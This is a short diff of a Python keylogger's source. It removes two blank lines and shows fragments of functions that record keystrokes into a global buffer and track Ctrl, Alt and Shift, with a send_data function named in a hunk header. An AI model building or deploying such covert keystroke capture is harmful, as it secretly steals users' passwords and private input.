@@ -45,7 +45,6 @@ def send_data():
 
 def handle_keystrokes(key):
     global keystrokes, ctrl_pressed, alt_pressed, shift_pressed
-
     try:
         if key == keyboard.Key.enter:
             keystrokes += "\n"  # Add newline character for Enter key
@@ -73,7 +72,6 @@ def handle_keystrokes(key):
 
 def on_release(key):
     global ctrl_pressed, alt_pressed, shift_pressed
-
     if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
         ctrl_pressed = False
     elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
